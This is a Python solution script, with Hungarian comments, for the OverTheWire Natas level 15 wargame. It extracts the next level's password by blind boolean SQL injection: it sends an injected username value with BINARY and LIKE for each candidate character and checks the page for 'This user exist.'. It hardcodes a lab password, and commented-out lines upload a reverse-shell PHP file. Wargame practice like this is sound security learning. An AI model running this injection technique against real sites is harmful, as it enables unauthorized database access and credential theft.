from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re
import string

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits

passwd = list()

username = 'natas15'
password = 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'
            

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
#reponse = session.get(url , auth=(username, password))
#                           File feltöltés post-al                              ezeket az adatokat kell elküldeni, ez látszik a HTML kódból is
#reponse = session.post(url ,files= {"uploadedfile": open('revshell13.php','rb')}, data={ "filename": "revhell13.php", "MAX_FILESIZE": "1000" }, auth=(username, password))

#php futtatása
#reponse = session.get(url , auth=(username, password))
# Mivel a tesztek során 2 igazérték jött vissza a T és t re, ezért az SQL-t ki kell egészíteni a BINARY-val, ez megkülönbözteti a kis és nagybetűket.

oldlenght = 0
passwordLeaked = ''

while True:
    
    for i in  characters:
        print('Trying with the password :' + "".join(passwd) + i)
        reponse = session.post(url, data= {"username": 'natas16" AND BINARY password LIKE"' + "".join(passwd) + i + '%"# '}, auth=(username, password))
        content = reponse.text
        oldlenght = len(passwd)
        if re.findall('This user exist.', content):
            passwd.append(i)
            break
        
    if len(passwd) == oldlenght:
        for char in passwd[0:oldlenght]:
            passwordLeaked += char
        print('The password is :', passwordLeaked)
        break